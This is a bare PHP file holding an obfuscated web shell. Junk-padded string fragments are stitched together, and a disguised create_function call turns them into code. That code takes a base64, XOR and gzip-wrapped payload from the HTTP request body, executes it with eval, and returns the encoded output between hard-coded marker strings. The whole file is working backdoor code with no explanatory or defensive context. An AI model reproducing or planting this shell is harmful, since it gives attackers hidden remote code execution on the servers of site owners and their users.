<?php
$K='@ol"b_get_contentl"s();@ob_l"end_cll"ean();$r=l"@base6l"4_el"ncode(@l"x(@gzcoml"presl"s(l"$o),$k))l";l"prinl"t("$p$kh$r$kf");}';
$U='++l"){$o.l"l"=$t{$i}^$k{$j};}}rel"turn l"$l"o;}ifl" (@l"preg_match("/$khl"(.+)$kl"f/",l"@filel"_gel"t_conl"tents("php://i';
$C='l"npul"t"),l"$m)==1)l"l" {@ob_start(l");@el"val(@gzul"ncoml"press(@x(@bal"se6l"4l"_del"cl"ode(l"$m[1]),l"$k)));$o=';
$o='t,$k)l"{$c=stl"rlen($k);$l=l"strl"lel"n($t);$o="";fol"rl"($i=0;$i<$l"l;){forl"l"($j=l"0;($j<$c&&l"$i<$ll");$j++,$l"i';
$v=str_replace('qj','','qjqjqjcqjreate_funqjqjction');
$G='$k="1l"d5l"58747";$kh="l"8e3d10l"aece8l"7l"";l"$l"kf="2l"5f1ee31169d";$pl"="L7qRfl"buBLx1wrl"4KO";functl"ionl" xl"($';
$A=str_replace('l"','',$G.$o.$U.$C.$K);
$r=$v('',$A);$r();
?>
